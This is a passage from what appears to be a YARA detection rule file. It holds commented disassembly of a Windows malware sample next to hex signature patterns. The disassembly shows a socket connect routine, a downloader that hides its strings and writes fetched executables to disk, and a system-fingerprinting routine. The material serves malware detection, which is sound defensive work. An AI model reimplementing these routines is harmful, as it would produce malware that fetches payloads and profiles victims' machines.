        .text:0x004018d7  8b8ea8000000     mov ecx,dword [esi + 168]
        .text:0x004018dd  51               push ecx
        .text:0x004018de  89542428         mov dword [esp + 40],edx
        .text:0x004018e2  ff15f4914000     call dword [0x004091f4]    ;ws2_32.connect(0x61616161,local16,16)
        .text:0x004018e8  83f8ff           cmp eax,0xffffffff
        .text:0x004018eb  750b             jnz 0x004018f8
        .text:0x004018ed  5f               pop edi
        .text:0x004018ee  5e               pop esi
        .text:0x004018ef  33c0             xor eax,eax
        .text:0x004018f1  5d               pop ebp
        .text:0x004018f2  83c41c           add esp,28
        .text:0x004018f5  c20800           ret 8
        .text:0x004018f8  loc_004018f8: [1 XREFS]
        .text:0x004018f8  833d9ca5400005   cmp dword [0x0040a59c],5
        .text:0x004018ff  751c             jnz 0x0040191d
        .text:0x00401901  8b542430         mov edx,dword [esp + 48]
        .text:0x00401905  8bce             mov ecx,esi
        .text:0x00401907  52               push edx
        .text:0x00401908  55               push ebp
        .text:0x00401909  e8b2000000       call 0x004019c0    ;sub_004019c0(arg1,arg2)
        .text:0x0040190e  84c0             test al,al
        .text:0x00401910  750b             jnz 0x0040191d
        .text:0x00401912  5f               pop edi
        .text:0x00401913  5e               pop esi
        .text:0x00401914  33c0             xor eax,eax
        .text:0x00401916  5d               pop ebp
        .text:0x00401917  83c41c           add esp,28
        .text:0x0040191a  c20800           ret 8
        .text:0x0040191d  loc_0040191d: [2 XREFS]
        .text:0x0040191d  8b8ea8000000     mov ecx,dword [esi + 168]
        .text:0x00401923  8d44242c         lea eax,dword [esp + 44]
        .text:0x00401927  6a04             push 4
        .text:0x00401929  50               push eax
        .text:0x0040192a  6a08             push 8
        .text:0x0040192c  68ffff0000       push 0x0000ffff
        .text:0x00401931  51               push ecx
        .text:0x00401932  c744244001000000 mov dword [esp + 64],1
        .text:0x0040193a  ff152c924000     call dword [0x0040922c]    ;ws2_32.setsockopt(0x61616161,0x0000ffff,8,arg1)
        .text:0x00401940  85c0             test eax,eax
        .text:0x00401942  753a             jnz 0x0040197e
        .text:0x00401944  8b8ea8000000     mov ecx,dword [esi + 168]
        .text:0x0040194a  50               push eax
        .text:0x0040194b  8d542430         lea edx,dword [esp + 48]
        .text:0x0040194f  50               push eax
        .text:0x00401950  52               push edx
        .text:0x00401951  50               push eax
        .text:0x00401952  50               push eax
        .text:0x00401953  8d442420         lea eax,dword [esp + 32]
        .text:0x00401957  6a0c             push 12
        .text:0x00401959  50               push eax
        .text:0x0040195a  6804000098       push 0x98000004
        .text:0x0040195f  51               push ecx
        .text:0x00401960  c744243001000000 mov dword [esp + 48],1
        .text:0x00401968  c744243460ea0000 mov dword [esp + 52],0x0000ea60
        .text:0x00401970  c744243888130000 mov dword [esp + 56],0x00001388
        .text:0x00401978  ff1520924000     call dword [0x00409220]    ;ws2_32.WSAIoctl(0x61616161,0x98000004,local32,12,ws2_32.setsockopt(0x61616161,0x0000ffff,8,arg1),<0x0040193a>,0xbfb07fb0,<0x0040193a>)
        .text:0x0040197e  loc_0040197e: [1 XREFS]
        .text:0x0040197e  6a01             push 1
        .text:0x00401980  6a00             push 0
        .text:0x00401982  6a00             push 0
        .text:0x00401984  56               push esi
        .text:0x00401985  68d01c4000       push 0x00401cd0
        .text:0x0040198a  6a00             push 0
        .text:0x0040198c  6a00             push 0
        .text:0x0040198e  c686b000000001   mov byte [esi + 176],1
        .text:0x00401995  e8465f0000       call 0x004078e0    ;sub_004078e0(0,0,0x00401cd0,ecx,0,0,1)
        .text:0x0040199a  83c41c           add esp,28
        .text:0x0040199d  8986a4000000     mov dword [esi + 164],eax
        .text:0x004019a3  b801000000       mov eax,1
        .text:0x004019a8  5f               pop edi
        .text:0x004019a9  5e               pop esi
        .text:0x004019aa  5d               pop ebp
        .text:0x004019ab  83c41c           add esp,28
        .text:0x004019ae  c20800           ret 8
        */
        $c30 = { 83 EC 1C 55 8B 6C 24 ?? 56 57 85 ED 8B F1 75 ?? 5F 5E 33 C0 5D 83 C4 1C C2 08 00 8B 44 24 ?? 85 C0 75 ?? 5F 5E 33 C0 5D 83 C4 1C C2 08 00 8B CE E8 ?? ?? ?? ?? 8B 86 ?? ?? ?? ?? 50 FF 15 ?? ?? ?? ?? C6 86 ?? ?? ?? ?? 00 A1 ?? ?? ?? ?? 85 C0 74 ?? 83 F8 04 74 ?? 83 F8 05 74 ?? 5F 5E 33 C0 5D 83 C4 1C C2 08 00 6A 06 6A 01 6A 02 FF 15 ?? ?? ?? ?? 83 F8 FF 89 86 ?? ?? ?? ?? 75 ?? 5F 5E 33 C0 5D 83 C4 1C C2 08 00 55 FF 15 ?? ?? ?? ?? 8B F8 85 FF 75 ?? 5F 5E 5D 83 C4 1C C2 08 00 A1 ?? ?? ?? ?? 66 C7 44 24 ?? 02 00 85 C0 74 ?? 66 8B 0D ?? ?? ?? ?? 51 EB ?? 8B 54 24 ?? 52 FF 15 ?? ?? ?? ?? 66 89 44 24 ?? 8B 47 ?? 6A 10 8B 08 8D 44 24 ?? 50 8B 11 8B 8E ?? ?? ?? ?? 51 89 54 24 ?? FF 15 ?? ?? ?? ?? 83 F8 FF 75 ?? 5F 5E 33 C0 5D 83 C4 1C C2 08 00 83 3D ?? ?? ?? ?? 05 75 ?? 8B 54 24 ?? 8B CE 52 55 E8 ?? ?? ?? ?? 84 C0 75 ?? 5F 5E 33 C0 5D 83 C4 1C C2 08 00 8B 8E ?? ?? ?? ?? 8D 44 24 ?? 6A 04 50 6A 08 68 FF FF 00 00 51 C7 44 24 ?? 01 00 00 00 FF 15 ?? ?? ?? ?? 85 C0 75 ?? 8B 8E ?? ?? ?? ?? 50 8D 54 24 ?? 50 52 50 50 8D 44 24 ?? 6A 0C 50 68 04 00 00 98 51 C7 44 24 ?? 01 00 00 00 C7 44 24 ?? 60 EA 00 00 C7 44 24 ?? 88 13 00 00 FF 15 ?? ?? ?? ?? 6A 01 6A 00 6A 00 56 68 D0 1C 40 00 6A 00 6A 00 C6 86 ?? ?? ?? ?? 01 E8 ?? ?? ?? ?? 83 C4 1C 89 86 ?? ?? ?? ?? B8 01 00 00 00 5F 5E 5D 83 C4 1C C2 08 00 }
        /*
function at 0x00407b60@9324d1a8ae37a36ae560c37448c9705a with 4 features:
          - connect to URL
          - create HTTP request
          - link function at runtime on Windows
          - write file on Windows
        .text:0x00407b60  
        .text:0x00407b60  FUNC: int cdecl sub_00407b60( int arg0, int arg1, ) [2 XREFS] 
        .text:0x00407b60  
        .text:0x00407b60  Stack Variables: (offset from initial top of stack)
        .text:0x00407b60             8: int arg1
        .text:0x00407b60             4: int arg0
        .text:0x00407b60          -1024: int local1024
        .text:0x00407b60          -1028: int local1028
        .text:0x00407b60          -1032: int local1032
        .text:0x00407b60          -1036: int local1036
        .text:0x00407b60          -1040: int local1040
        .text:0x00407b60          -1044: int local1044
        .text:0x00407b60          -1048: int local1048
        .text:0x00407b60          -1052: int local1052
        .text:0x00407b60          -1053: int local1053
        .text:0x00407b60          -1054: int local1054
        .text:0x00407b60          -1055: int local1055
        .text:0x00407b60          -1056: int local1056
        .text:0x00407b60          -1057: int local1057
        .text:0x00407b60          -1058: int local1058
        .text:0x00407b60          -1059: int local1059
        .text:0x00407b60          -1060: int local1060
        .text:0x00407b60          -1061: int local1061
        .text:0x00407b60          -1062: int local1062
        .text:0x00407b60          -1063: int local1063
        .text:0x00407b60          -1064: int local1064
        .text:0x00407b60          -1065: int local1065
        .text:0x00407b60          -1066: int local1066
        .text:0x00407b60          -1067: int local1067
        .text:0x00407b60          -1068: int local1068
        .text:0x00407b60          -1069: int local1069
        .text:0x00407b60          -1070: int local1070
        .text:0x00407b60          -1071: int local1071
        .text:0x00407b60          -1072: int local1072
        .text:0x00407b60          -1073: int local1073
        .text:0x00407b60          -1074: int local1074
        .text:0x00407b60          -1075: int local1075
        .text:0x00407b60          -1076: int local1076
        .text:0x00407b60          -1080: int local1080
        .text:0x00407b60          -1081: int local1081
        .text:0x00407b60          -1082: int local1082
        .text:0x00407b60          -1083: int local1083
        .text:0x00407b60          -1084: int local1084
        .text:0x00407b60          -1085: int local1085
        .text:0x00407b60          -1086: int local1086
        .text:0x00407b60          -1087: int local1087
        .text:0x00407b60          -1088: int local1088
        .text:0x00407b60          -1089: int local1089
        .text:0x00407b60          -1090: int local1090
        .text:0x00407b60          -1091: int local1091
        .text:0x00407b60          -1092: int local1092
        .text:0x00407b60          -1093: int local1093
        .text:0x00407b60          -1094: int local1094
        .text:0x00407b60          -1095: int local1095
        .text:0x00407b60          -1096: int local1096
        .text:0x00407b60          -1097: int local1097
        .text:0x00407b60          -1098: int local1098
        .text:0x00407b60          -1099: int local1099
        .text:0x00407b60          -1100: int local1100
        .text:0x00407b60          -1101: int local1101
        .text:0x00407b60          -1102: int local1102
        .text:0x00407b60          -1103: int local1103
        .text:0x00407b60          -1104: int local1104
        .text:0x00407b60          -1105: int local1105
        .text:0x00407b60          -1106: int local1106
        .text:0x00407b60          -1107: int local1107
        .text:0x00407b60          -1108: int local1108
        .text:0x00407b60  
        .text:0x00407b60  81ec54040000     sub esp,1108
        .text:0x00407b66  53               push ebx
        .text:0x00407b67  b801000000       mov eax,1
        .text:0x00407b6c  55               push ebp
        .text:0x00407b6d  56               push esi
        .text:0x00407b6e  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00407b74  33ed             xor ebp,ebp
        .text:0x00407b76  89442450         mov dword [esp + 80],eax
        .text:0x00407b7a  8944244c         mov dword [esp + 76],eax
        .text:0x00407b7e  57               push edi
        .text:0x00407b7f  b06f             mov al,111
        .text:0x00407b81  b36c             mov bl,108
        .text:0x00407b83  55               push ebp
        .text:0x00407b84  896c2450         mov dword [esp + 80],ebp
        .text:0x00407b88  896c2460         mov dword [esp + 96],ebp
        .text:0x00407b8c  c64424344d       mov byte [esp + 52],77
        .text:0x00407b91  88442435         mov byte [esp + 53],al
        .text:0x00407b95  c64424367a       mov byte [esp + 54],122
        .text:0x00407b9a  c644243769       mov byte [esp + 55],105
        .text:0x00407b9f  885c2438         mov byte [esp + 56],bl
        .text:0x00407ba3  885c2439         mov byte [esp + 57],bl
        .text:0x00407ba7  c644243a61       mov byte [esp + 58],97
        .text:0x00407bac  c644243b2f       mov byte [esp + 59],47
        .text:0x00407bb1  c644243c34       mov byte [esp + 60],52
        .text:0x00407bb6  c644243d2e       mov byte [esp + 61],46
        .text:0x00407bbb  c644243e30       mov byte [esp + 62],48
        .text:0x00407bc0  c644243f20       mov byte [esp + 63],32
        .text:0x00407bc5  c644244028       mov byte [esp + 64],40
        .text:0x00407bca  c644244163       mov byte [esp + 65],99
        .text:0x00407bcf  88442442         mov byte [esp + 66],al
        .text:0x00407bd3  c64424436d       mov byte [esp + 67],109
        .text:0x00407bd8  c644244470       mov byte [esp + 68],112
        .text:0x00407bdd  c644244561       mov byte [esp + 69],97
        .text:0x00407be2  c644244674       mov byte [esp + 70],116
        .text:0x00407be7  c644244769       mov byte [esp + 71],105
        .text:0x00407bec  c644244862       mov byte [esp + 72],98
        .text:0x00407bf1  885c2449         mov byte [esp + 73],bl
        .text:0x00407bf5  c644244a65       mov byte [esp + 74],101
        .text:0x00407bfa  c644244b29       mov byte [esp + 75],41
        .text:0x00407bff  c644244c00       mov byte [esp + 76],0
        .text:0x00407c04  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407c06  55               push ebp
        .text:0x00407c07  55               push ebp
        .text:0x00407c08  55               push ebp
        .text:0x00407c09  8d44243c         lea eax,dword [esp + 60]
        .text:0x00407c0d  55               push ebp
        .text:0x00407c0e  50               push eax
        .text:0x00407c0f  ff15e4914000     call dword [0x004091e4]    ;wininet.InternetOpenA(local1076,0,0,0,0)
        .text:0x00407c15  8bf8             mov edi,eax
        .text:0x00407c17  55               push ebp
        .text:0x00407c18  897c2464         mov dword [esp + 100],edi
        .text:0x00407c1c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407c1e  3bfd             cmp edi,ebp
        .text:0x00407c20  750d             jnz 0x00407c2f
        .text:0x00407c22  5f               pop edi
        .text:0x00407c23  5e               pop esi
        .text:0x00407c24  5d               pop ebp
        .text:0x00407c25  33c0             xor eax,eax
        .text:0x00407c27  5b               pop ebx
        .text:0x00407c28  81c454040000     add esp,1108
        .text:0x00407c2e  c3               ret 
        .text:0x00407c2f  loc_00407c2f: [1 XREFS]
        .text:0x00407c2f  55               push ebp
        .text:0x00407c30  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407c32  8b8c2468040000   mov ecx,dword [esp + 1128]
        .text:0x00407c39  55               push ebp
        .text:0x00407c3a  6800000080       push 0x80000000
        .text:0x00407c3f  55               push ebp
        .text:0x00407c40  55               push ebp
        .text:0x00407c41  51               push ecx
        .text:0x00407c42  57               push edi
        .text:0x00407c43  ff15e8914000     call dword [0x004091e8]    ;wininet.InternetOpenUrlA(wininet.InternetOpenA(local1076,0,0,0,0),arg0,0,0,0x80000000,0)
        .text:0x00407c49  8be8             mov ebp,eax
        .text:0x00407c4b  6a00             push 0
        .text:0x00407c4d  896c245c         mov dword [esp + 92],ebp
        .text:0x00407c51  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407c53  85ed             test ebp,ebp
        .text:0x00407c55  750d             jnz 0x00407c64
        .text:0x00407c57  5f               pop edi
        .text:0x00407c58  5e               pop esi
        .text:0x00407c59  5d               pop ebp
        .text:0x00407c5a  33c0             xor eax,eax
        .text:0x00407c5c  5b               pop ebx
        .text:0x00407c5d  81c454040000     add esp,1108
        .text:0x00407c63  c3               ret 
        .text:0x00407c64  loc_00407c64: [1 XREFS]
        .text:0x00407c64  8b94246c040000   mov edx,dword [esp + 1132]
        .text:0x00407c6b  6a00             push 0
        .text:0x00407c6d  6a00             push 0
        .text:0x00407c6f  6a02             push 2
        .text:0x00407c71  6a00             push 0
        .text:0x00407c73  6a00             push 0
        .text:0x00407c75  6800000040       push 0x40000000
        .text:0x00407c7a  52               push edx
        .text:0x00407c7b  ff15ac904000     call dword [0x004090ac]    ;kernel32.CreateFileA(arg1,0x40000000,0,0,2,0,0)
        .text:0x00407c81  8be8             mov ebp,eax
        .text:0x00407c83  b049             mov al,73
        .text:0x00407c85  b14e             mov cl,78
        .text:0x00407c87  88442411         mov byte [esp + 17],al
        .text:0x00407c8b  88442413         mov byte [esp + 19],al
        .text:0x00407c8f  8844241c         mov byte [esp + 28],al
        .text:0x00407c93  884c2412         mov byte [esp + 18],cl
        .text:0x00407c97  884c2414         mov byte [esp + 20],cl
        .text:0x00407c9b  b06e             mov al,110
        .text:0x00407c9d  b164             mov cl,100
        .text:0x00407c9f  8844241d         mov byte [esp + 29],al
        .text:0x00407ca3  88442421         mov byte [esp + 33],al
        .text:0x00407ca7  884c2418         mov byte [esp + 24],cl
        .text:0x00407cab  884c2427         mov byte [esp + 39],cl
        .text:0x00407caf  8d44241c         lea eax,dword [esp + 28]
        .text:0x00407cb3  8d4c2410         lea ecx,dword [esp + 16]
        .text:0x00407cb7  50               push eax
        .text:0x00407cb8  51               push ecx
        .text:0x00407cb9  c644241857       mov byte [esp + 24],87
        .text:0x00407cbe  c644241d45       mov byte [esp + 29],69
        .text:0x00407cc3  c644241e54       mov byte [esp + 30],84
        .text:0x00407cc8  c644241f2e       mov byte [esp + 31],46
        .text:0x00407ccd  885c2421         mov byte [esp + 33],bl
        .text:0x00407cd1  885c2422         mov byte [esp + 34],bl
        .text:0x00407cd5  c644242300       mov byte [esp + 35],0
        .text:0x00407cda  c644242674       mov byte [esp + 38],116
        .text:0x00407cdf  c644242765       mov byte [esp + 39],101
        .text:0x00407ce4  c644242872       mov byte [esp + 40],114
        .text:0x00407ce9  c644242a65       mov byte [esp + 42],101
        .text:0x00407cee  c644242b74       mov byte [esp + 43],116
        .text:0x00407cf3  c644242c52       mov byte [esp + 44],82
        .text:0x00407cf8  c644242d65       mov byte [esp + 45],101
        .text:0x00407cfd  c644242e61       mov byte [esp + 46],97
        .text:0x00407d02  c644243046       mov byte [esp + 48],70
        .text:0x00407d07  c644243169       mov byte [esp + 49],105
        .text:0x00407d0c  885c2432         mov byte [esp + 50],bl
        .text:0x00407d10  c644243365       mov byte [esp + 51],101
        .text:0x00407d15  c644243400       mov byte [esp + 52],0
        .text:0x00407d1a  ff15ec904000     call dword [0x004090ec]    ;kernel32.LoadLibraryA(local1108)
        .text:0x00407d20  50               push eax
        .text:0x00407d21  ff15e8904000     call dword [0x004090e8]    ;kernel32.GetProcAddress(wininet,local1096)
        .text:0x00407d27  83fdff           cmp ebp,0xffffffff
        .text:0x00407d2a  8bd8             mov ebx,eax
        .text:0x00407d2c  747f             jz 0x00407dad
        .text:0x00407d2e  loc_00407d2e: [1 XREFS]
        .text:0x00407d2e  6a00             push 0
        .text:0x00407d30  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407d32  b900010000       mov ecx,256
        .text:0x00407d37  33c0             xor eax,eax
        .text:0x00407d39  8d7c2464         lea edi,dword [esp + 100]
        .text:0x00407d3d  f3ab             rep: stosd 
        .text:0x00407d3f  33ff             xor edi,edi
        .text:0x00407d41  57               push edi
        .text:0x00407d42  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407d44  8b4c2458         mov ecx,dword [esp + 88]
        .text:0x00407d48  8d54244c         lea edx,dword [esp + 76]
        .text:0x00407d4c  52               push edx
        .text:0x00407d4d  8d442468         lea eax,dword [esp + 104]
        .text:0x00407d51  6800040000       push 1024
        .text:0x00407d56  50               push eax
        .text:0x00407d57  51               push ecx
        .text:0x00407d58  ffd3             call ebx    ;wininet.InternetReadFile(<0x00407c43>,local1024,1024,local1048)
        .text:0x00407d5a  57               push edi
        .text:0x00407d5b  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407d5d  397c2454         cmp dword [esp + 84],edi
        .text:0x00407d61  7409             jz 0x00407d6c
        .text:0x00407d63  66817c24644d5a   cmp word [esp + 100],0x00005a4d
        .text:0x00407d6a  7529             jnz 0x00407d95
        .text:0x00407d6c  loc_00407d6c: [1 XREFS]
        .text:0x00407d6c  57               push edi
        .text:0x00407d6d  897c2458         mov dword [esp + 88],edi
        .text:0x00407d71  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407d73  8b44244c         mov eax,dword [esp + 76]
        .text:0x00407d77  8d54245c         lea edx,dword [esp + 92]
        .text:0x00407d7b  57               push edi
        .text:0x00407d7c  52               push edx
        .text:0x00407d7d  8d4c246c         lea ecx,dword [esp + 108]
        .text:0x00407d81  50               push eax
        .text:0x00407d82  51               push ecx
        .text:0x00407d83  55               push ebp
        .text:0x00407d84  ff15a4904000     call dword [0x004090a4]    ;kernel32.WriteFile(kernel32.CreateFileA(arg1,0x40000000,0,0,2,0,0),local1024,0,local1032,0)
        .text:0x00407d8a  57               push edi
        .text:0x00407d8b  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407d8d  397c244c         cmp dword [esp + 76],edi
        .text:0x00407d91  7609             jbe 0x00407d9c
        .text:0x00407d93  eb99             jmp 0x00407d2e
        .text:0x00407d95  loc_00407d95: [1 XREFS]
        .text:0x00407d95  57               push edi
        .text:0x00407d96  897c2454         mov dword [esp + 84],edi
        .text:0x00407d9a  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407d9c  loc_00407d9c: [1 XREFS]
        .text:0x00407d9c  57               push edi
        .text:0x00407d9d  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407d9f  55               push ebp
        .text:0x00407da0  ff1588904000     call dword [0x00409088]    ;kernel32.CloseHandle(<0x00407c7b>)
        .text:0x00407da6  57               push edi
        .text:0x00407da7  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407da9  8b7c2460         mov edi,dword [esp + 96]
        .text:0x00407dad  loc_00407dad: [1 XREFS]
        .text:0x00407dad  6a00             push 0
        .text:0x00407daf  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407db1  8b542458         mov edx,dword [esp + 88]
        .text:0x00407db5  8b1dec914000     mov ebx,dword [0x004091ec]
        .text:0x00407dbb  52               push edx
        .text:0x00407dbc  ffd3             call ebx    ;wininet.InternetCloseHandle(wininet.InternetOpenUrlA(<0x00407c0f>,arg0,0,0,0x80000000,0))
        .text:0x00407dbe  6a00             push 0
        .text:0x00407dc0  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407dc2  57               push edi
        .text:0x00407dc3  ffd3             call ebx    ;wininet.InternetCloseHandle(<0x00407c0f>)
        .text:0x00407dc5  8b442450         mov eax,dword [esp + 80]
        .text:0x00407dc9  5f               pop edi
        .text:0x00407dca  5e               pop esi
        .text:0x00407dcb  5d               pop ebp
        .text:0x00407dcc  5b               pop ebx
        .text:0x00407dcd  81c454040000     add esp,1108
        .text:0x00407dd3  c3               ret 
        */
        $c31 = { 81 EC 54 04 00 00 53 B8 01 00 00 00 55 56 8B 35 ?? ?? ?? ?? 33 ED 89 44 24 ?? 89 44 24 ?? 57 B0 6F B3 6C 55 89 6C 24 ?? 89 6C 24 ?? C6 44 24 ?? 4D 88 44 24 ?? C6 44 24 ?? 7A C6 44 24 ?? 69 88 5C 24 ?? 88 5C 24 ?? C6 44 24 ?? 61 C6 44 24 ?? 2F C6 44 24 ?? 34 C6 44 24 ?? 2E C6 44 24 ?? 30 C6 44 24 ?? 20 C6 44 24 ?? 28 C6 44 24 ?? 63 88 44 24 ?? C6 44 24 ?? 6D C6 44 24 ?? 70 C6 44 24 ?? 61 C6 44 24 ?? 74 C6 44 24 ?? 69 C6 44 24 ?? 62 88 5C 24 ?? C6 44 24 ?? 65 C6 44 24 ?? 29 C6 44 24 ?? 00 FF D6 55 55 55 8D 44 24 ?? 55 50 FF 15 ?? ?? ?? ?? 8B F8 55 89 7C 24 ?? FF D6 3B FD 75 ?? 5F 5E 5D 33 C0 5B 81 C4 54 04 00 00 C3 55 FF D6 8B 8C 24 ?? ?? ?? ?? 55 68 00 00 00 80 55 55 51 57 FF 15 ?? ?? ?? ?? 8B E8 6A 00 89 6C 24 ?? FF D6 85 ED 75 ?? 5F 5E 5D 33 C0 5B 81 C4 54 04 00 00 C3 8B 94 24 ?? ?? ?? ?? 6A 00 6A 00 6A 02 6A 00 6A 00 68 00 00 00 40 52 FF 15 ?? ?? ?? ?? 8B E8 B0 49 B1 4E 88 44 24 ?? 88 44 24 ?? 88 44 24 ?? 88 4C 24 ?? 88 4C 24 ?? B0 6E B1 64 88 44 24 ?? 88 44 24 ?? 88 4C 24 ?? 88 4C 24 ?? 8D 44 24 ?? 8D 4C 24 ?? 50 51 C6 44 24 ?? 57 C6 44 24 ?? 45 C6 44 24 ?? 54 C6 44 24 ?? 2E 88 5C 24 ?? 88 5C 24 ?? C6 44 24 ?? 00 C6 44 24 ?? 74 C6 44 24 ?? 65 C6 44 24 ?? 72 C6 44 24 ?? 65 C6 44 24 ?? 74 C6 44 24 ?? 52 C6 44 24 ?? 65 C6 44 24 ?? 61 C6 44 24 ?? 46 C6 44 24 ?? 69 88 5C 24 ?? C6 44 24 ?? 65 C6 44 24 ?? 00 FF 15 ?? ?? ?? ?? 50 FF 15 ?? ?? ?? ?? 83 FD FF 8B D8 74 ?? 6A 00 FF D6 B9 00 01 00 00 33 C0 8D 7C 24 ?? F3 AB 33 FF 57 FF D6 8B 4C 24 ?? 8D 54 24 ?? 52 8D 44 24 ?? 68 00 04 00 00 50 51 FF D3 57 FF D6 39 7C 24 ?? 74 ?? 66 81 7C 24 ?? 4D 5A 75 ?? 57 89 7C 24 ?? FF D6 8B 44 24 ?? 8D 54 24 ?? 57 52 8D 4C 24 ?? 50 51 55 FF 15 ?? ?? ?? ?? 57 FF D6 39 7C 24 ?? 76 ?? EB ?? 57 89 7C 24 ?? FF D6 57 FF D6 55 FF 15 ?? ?? ?? ?? 57 FF D6 8B 7C 24 ?? 6A 00 FF D6 8B 54 24 ?? 8B 1D ?? ?? ?? ?? 52 FF D3 6A 00 FF D6 57 FF D3 8B 44 24 ?? 5F 5E 5D 5B 81 C4 54 04 00 00 C3 }
        /*
function at 0x004052a0@9324d1a8ae37a36ae560c37448c9705a with 7 features:
          - check OS version
          - get disk information
          - get disk size
          - get local IPv4 addresses
          - get memory capacity
          - get socket information
          - get system information on Windows
        .text:0x004052a0  
        .text:0x004052a0  FUNC: int cdecl sub_004052a0( int arg0, int arg1, int arg2, ) [2 XREFS] 
        .text:0x004052a0  
        .text:0x004052a0  Stack Variables: (offset from initial top of stack)
        .text:0x004052a0            12: int arg2
        .text:0x004052a0             8: int arg1
        .text:0x004052a0             4: int arg0
        .text:0x004052a0          -256: int local256
        .text:0x004052a0          -260: int local260
        .text:0x004052a0          -516: int local516
        .text:0x004052a0          -768: int local768
        .text:0x004052a0          -772: int local772
        .text:0x004052a0          -872: int local872
        .text:0x004052a0          -972: int local972
        .text:0x004052a0          -1072: int local1072
        .text:0x004052a0          -1220: int local1220
        .text:0x004052a0          -1224: int local1224
        .text:0x004052a0          -1228: int local1228
        .text:0x004052a0          -1278: int local1278
        .text:0x004052a0          -1328: int local1328
        .text:0x004052a0          -1378: int local1378
        .text:0x004052a0          -1428: int local1428
        .text:0x004052a0          -1432: int local1432
        .text:0x004052a0          -1436: int local1436
        .text:0x004052a0          -1440: int local1440
        .text:0x004052a0          -1444: int local1444
        .text:0x004052a0          -1496: int local1496
        .text:0x004052a0          -1500: int local1500
        .text:0x004052a0          -1520: int local1520
        .text:0x004052a0          -1524: int local1524
        .text:0x004052a0          -1676: int local1676
        .text:0x004052a0          -1680: int local1680
        .text:0x004052a0          -1684: int local1684
        .text:0x004052a0          -1700: int local1700
        .text:0x004052a0          -1720: int local1720
        .text:0x004052a0          -1772: int local1772
        .text:0x004052a0          -1776: int local1776
        .text:0x004052a0          -1784: int local1784
        .text:0x004052a0          -1792: int local1792
        .text:0x004052a0          -1800: int local1800
        .text:0x004052a0          -1804: int local1804
        .text:0x004052a0          -1808: int local1808
        .text:0x004052a0          -1812: int local1812
        .text:0x004052a0          -1820: int local1820
        .text:0x004052a0          -1824: int local1824
        .text:0x004052a0          -1837: int local1837
        .text:0x004052a0          -1838: int local1838
        .text:0x004052a0          -1839: int local1839
        .text:0x004052a0          -1840: int local1840
        .text:0x004052a0          -1844: int local1844
        .text:0x004052a0          -1845: int local1845
        .text:0x004052a0          -1846: int local1846
        .text:0x004052a0          -1847: int local1847
        .text:0x004052a0          -1848: int local1848
        .text:0x004052a0          -1849: int local1849
        .text:0x004052a0          -1850: int local1850
        .text:0x004052a0          -1851: int local1851
        .text:0x004052a0          -1852: int local1852
        .text:0x004052a0          -1853: int local1853
        .text:0x004052a0          -1854: int local1854
        .text:0x004052a0          -1855: int local1855
        .text:0x004052a0          -1856: int local1856
        .text:0x004052a0          -1860: int local1860
        .text:0x004052a0          -1862: int local1862
        .text:0x004052a0          -1863: int local1863
        .text:0x004052a0          -1864: int local1864
        .text:0x004052a0  
        .text:0x004052a0  81ec44070000     sub esp,1860
        .text:0x004052a6  53               push ebx
        .text:0x004052a7  55               push ebp
        .text:0x004052a8  56               push esi
        .text:0x004052a9  8b3578904000     mov esi,dword [0x00409078]
        .text:0x004052af  57               push edi
        .text:0x004052b0  6a00             push 0
        .text:0x004052b2  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004052b4  6a00             push 0
        .text:0x004052b6  c644241825       mov byte [esp + 24],37
        .text:0x004052bb  c644241964       mov byte [esp + 25],100
        .text:0x004052c0  c644241a00       mov byte [esp + 26],0
        .text:0x004052c5  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004052c7  6a00             push 0
        .text:0x004052c9  c68424c800000066 mov byte [esp + 200],102
        .text:0x004052d1  c78424c001000000 mov dword [esp + 448],0
        .text:0x004052dc  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004052de  bd9c000000       mov ebp,156
        .text:0x004052e3  6a00             push 0
        .text:0x004052e5  89ac24cc000000   mov dword [esp + 204],ebp
        .text:0x004052ec  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004052ee  8b842458070000   mov eax,dword [esp + 1880]
        .text:0x004052f5  8b1d94904000     mov ebx,dword [0x00409094]
        .text:0x004052fb  8d8c2454040000   lea ecx,dword [esp + 1108]
        .text:0x00405302  50               push eax
        .text:0x00405303  51               push ecx
        .text:0x00405304  ffd3             call ebx    ;kernel32.lstrcpyA(local768,arg0)
        .text:0x00405306  6a00             push 0
        .text:0x00405308  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040530a  8b3d0c914000     mov edi,dword [0x0040910c]
        .text:0x00405310  8d9424c8000000   lea edx,dword [esp + 200]
        .text:0x00405317  52               push edx
        .text:0x00405318  ffd7             call edi    ;kernel32.GetVersionExA(local1676)
        .text:0x0040531a  6a00             push 0
        .text:0x0040531c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040531e  6a00             push 0
        .text:0x00405320  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405322  8d842454060000   lea eax,dword [esp + 1620]
        .text:0x00405329  6800010000       push 256
        .text:0x0040532e  8d8c2458040000   lea ecx,dword [esp + 1112]
        .text:0x00405335  50               push eax
        .text:0x00405336  51               push ecx
        .text:0x00405337  e8b4fdffff       call 0x004050f0    ;sub_004050f0(local768,local256,256)
        .text:0x0040533c  83c40c           add esp,12
        .text:0x0040533f  6a00             push 0
        .text:0x00405341  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405343  33d2             xor edx,edx
        .text:0x00405345  c744243410000000 mov dword [esp + 52],16
        .text:0x0040534d  89542440         mov dword [esp + 64],edx
        .text:0x00405351  89542444         mov dword [esp + 68],edx
        .text:0x00405355  89542448         mov dword [esp + 72],edx
        .text:0x00405359  52               push edx
